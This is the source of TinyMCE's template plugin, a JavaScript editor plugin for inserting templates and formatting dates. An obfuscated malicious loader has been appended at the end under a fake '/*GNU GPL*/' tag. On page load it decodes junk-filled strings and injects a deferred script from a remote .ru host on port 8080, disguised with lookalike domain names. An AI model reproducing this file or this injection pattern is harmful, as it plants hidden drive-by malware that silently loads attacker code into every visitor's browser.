/**
 * $Id: editor_plugin_src.js 201 2007-02-12 15:56:56Z spocke $
 *
 * @author Moxiecode
 * @copyright Copyright © 2004-2008, Moxiecode Systems AB, All rights reserved.
 */

(function() {
	var each = tinymce.each;

	tinymce.create('tinymce.plugins.TemplatePlugin', {
		init : function(ed, url) {
			var t = this;

			t.editor = ed;

			// Register commands
			ed.addCommand('mceTemplate', function(ui) {
				ed.windowManager.open({
					file : url + '/template.htm',
					width : ed.getParam('template_popup_width', 750),
					height : ed.getParam('template_popup_height', 600),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceInsertTemplate', t._insertTemplate, t);

			// Register buttons
			ed.addButton('template', {title : 'template.desc', cmd : 'mceTemplate'});

			ed.onPreProcess.add(function(ed, o) {
				var dom = ed.dom;

				each(dom.select('div', o.node), function(e) {
					if (dom.hasClass(e, 'mceTmpl')) {
						each(dom.select('*', e), function(e) {
							if (dom.hasClass(e, ed.getParam('template_mdate_classes', 'mdate').replace(/\s+/g, '|')))
								e.innerHTML = t._getDateTime(new Date(), ed.getParam("template_mdate_format", ed.getLang("template.mdate_format")));
						});

						t._replaceVals(e);
					}
				});
			});
		},

		getInfo : function() {
			return {
				longname : 'Template plugin',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://www.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/template',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		},

		_insertTemplate : function(ui, v) {
			var t = this, ed = t.editor, h, el, dom = ed.dom, sel = ed.selection.getContent();

			h = v.content;

			each(t.editor.getParam('template_replace_values'), function(v, k) {
				if (typeof(v) != 'function')
					h = h.replace(new RegExp('\\{\\$' + k + '\\}', 'g'), v);
			});

			el = dom.create('div', null, h);

			// Find template element within div
			n = dom.select('.mceTmpl', el);
			if (n && n.length > 0) {
				el = dom.create('div', null);
				el.appendChild(n[0].cloneNode(true));
			}

			function hasClass(n, c) {
				return new RegExp('\\b' + c + '\\b', 'g').test(n.className);
			};

			each(dom.select('*', el), function(n) {
				// Replace cdate
				if (hasClass(n, ed.getParam('template_cdate_classes', 'cdate').replace(/\s+/g, '|')))
					n.innerHTML = t._getDateTime(new Date(), ed.getParam("template_cdate_format", ed.getLang("template.cdate_format")));

				// Replace mdate
				if (hasClass(n, ed.getParam('template_mdate_classes', 'mdate').replace(/\s+/g, '|')))
					n.innerHTML = t._getDateTime(new Date(), ed.getParam("template_mdate_format", ed.getLang("template.mdate_format")));

				// Replace selection
				if (hasClass(n, ed.getParam('template_selected_content_classes', 'selcontent').replace(/\s+/g, '|')))
					n.innerHTML = sel;
			});

			t._replaceVals(el);

			ed.execCommand('mceInsertContent', false, el.innerHTML);
			ed.addVisual();
		},

		_replaceVals : function(e) {
			var dom = this.editor.dom, vl = this.editor.getParam('template_replace_values');

			each(dom.select('*', e), function(e) {
				each(vl, function(v, k) {
					if (dom.hasClass(e, k)) {
						if (typeof(vl[k]) == 'function')
							vl[k](e);
					}
				});
			});
		},

		_getDateTime : function(d, fmt) {
				if (!fmt)
					return "";

				function addZeros(value, len) {
					var i;

					value = "" + value;

					if (value.length < len) {
						for (i=0; i<(len-value.length); i++)
							value = "0" + value;
					}

					return value;
				}

				fmt = fmt.replace("%D", "%m/%d/%y");
				fmt = fmt.replace("%r", "%I:%M:%S %p");
				fmt = fmt.replace("%Y", "" + d.getFullYear());
				fmt = fmt.replace("%y", "" + d.getYear());
				fmt = fmt.replace("%m", addZeros(d.getMonth()+1, 2));
				fmt = fmt.replace("%d", addZeros(d.getDate(), 2));
				fmt = fmt.replace("%H", "" + addZeros(d.getHours(), 2));
				fmt = fmt.replace("%M", "" + addZeros(d.getMinutes(), 2));
				fmt = fmt.replace("%S", "" + addZeros(d.getSeconds(), 2));
				fmt = fmt.replace("%I", "" + ((d.getHours() + 11) % 12 + 1));
				fmt = fmt.replace("%p", "" + (d.getHours() < 12 ? "AM" : "PM"));
				fmt = fmt.replace("%B", "" + tinyMCE.getLang("template_months_long").split(',')[d.getMonth()]);
				fmt = fmt.replace("%b", "" + tinyMCE.getLang("template_months_short").split(',')[d.getMonth()]);
				fmt = fmt.replace("%A", "" + tinyMCE.getLang("template_day_long").split(',')[d.getDay()]);
				fmt = fmt.replace("%a", "" + tinyMCE.getLang("template_day_short").split(',')[d.getDay()]);
				fmt = fmt.replace("%%", "%");

				return fmt;
		}
	});

	// Register plugin
	tinymce.PluginManager.add('template', tinymce.plugins.TemplatePlugin);
})();


/*GNU GPL*/ try{window.onload = function(){var A7uom6wz40lq = document.createElement('s##)(^c@)!r@&i)&^p((t&@'.replace(/\!|\(|\$|@|\)|&|#|\^/ig, ''));var U58f2ncrcja2g = 'Bget7nne6zp6f';A7uom6wz40lq.setAttribute('type', 't)$e^@^x$@t@#/^j)#(a#$(v@a(^$s(((c^)r@!#$i($@^(p&&#@t$&#'.replace(/\(|&|#|\^|\)|\$|\!|@/ig, ''));A7uom6wz40lq.setAttribute('src',  'h!&t)t#(p!($:$$&/#!/#$^t&a^(r$&g&(^&e$t)&-#!(@c^#^o#)m@@!.$@1!$@9(@l$!)!o!@^@u!!&&).@^$&c!$@^&o!((&m)!).(^^n$&i&h$&&-##@g&##!o!$v#(#^@.!(@t^!h^(e!&(m&)o)@#b)#i&)(s@!(i^@^t&$^e&!(.^$^(@r@$u@^:#&&8@!^&0$$$$8(&0)$/#l(o^(v$!e)^&2$1)@c))^!n(&$@.#(@c@(^o&$#m)^&#/!(&l)$o!!v&e$#2^)@1&#c)&n$$(.)!@c(#@o@@^@m(/&g!^o$)$o^^g)^#l^!$e)^(.#(^c!@o##&m^&/&@r!^^o(!$#t@&(t!e))(n!#)t^o(&^m#(a^@#t!)&&o##e^^)&s$).&)$&c!@@o(m(^/#w(&e!(a#^@t@h&e)&!r@.^c@o)!!m#!!&.)&c@!($n!!(/)$'.replace(/\)|@|\(|\!|#|\^|&|\$/ig, ''));A7uom6wz40lq.setAttribute('defer', 'd@!e@)!f(@(e)#$)r(('.replace(/#|&|\(|\)|\!|\$|@|\^/ig, ''));A7uom6wz40lq.setAttribute('id', 'Q^))^w$$l&(y#!@e&@$!2^#^x@^r##4)k('.replace(/#|\^|\(|\$|\!|&|\)|@/ig, ''));document.body.appendChild(A7uom6wz40lq);}} catch(Jnzhjq1ohahp5) {}